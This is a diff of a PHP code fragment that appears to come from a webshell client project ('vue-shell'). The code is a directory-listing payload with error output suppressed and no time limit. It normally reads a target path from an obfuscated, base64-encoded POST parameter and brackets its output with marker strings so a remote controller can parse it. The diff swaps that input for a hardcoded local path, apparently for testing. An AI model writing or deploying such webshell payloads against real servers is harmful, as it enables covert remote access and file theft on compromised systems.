@@ -197,20 +197,21 @@ class File {
         @ini_set("display_errors", "0");
         @set_time_limit(0);
         function asenc($out) {
-            return $out;
+//            return @base64_encode($out);
+            return @print_r($out);
         }
-
         function asoutput() {
             $output = ob_get_contents();
             ob_end_clean();
-            echo "cb3fbc4cab08";
+            echo "b4e38";
             echo @asenc($output);
-            echo "699eb5";
+            echo "202ac12e79";
         }
 
         ob_start();
         try {
-            $D = base64_decode($_POST["l2ab92367c79d6"]);
+//            $D = base64_decode('D:/safe/code/vue-shell/php-shell');
+            $D ='D:/safe/code/vue-shell/php-shell';
             $F = @opendir($D);
             if ($F == NULL) {
                 echo("ERROR:// Path Not Found Or No Permission!");
